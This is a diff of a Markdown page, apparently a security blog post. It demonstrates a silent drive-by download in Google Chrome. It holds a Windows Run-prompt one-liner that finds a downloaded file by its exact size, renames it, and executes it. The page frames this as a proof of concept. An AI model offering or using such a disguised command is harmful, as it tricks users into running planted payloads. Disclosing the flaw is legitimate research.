@@ -5,7 +5,7 @@ comments: true
 ---
 
 This demonstrates a fully silent drive-by download in Google Chrome -
-  and will launch a demo PoC if you dare to paste this seemingly harmless command in a Win+R prompt:
+  and will launch a demo PoC if this seemingly harmless command is entered in a **Win+R** prompt:
 
 <pre>
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
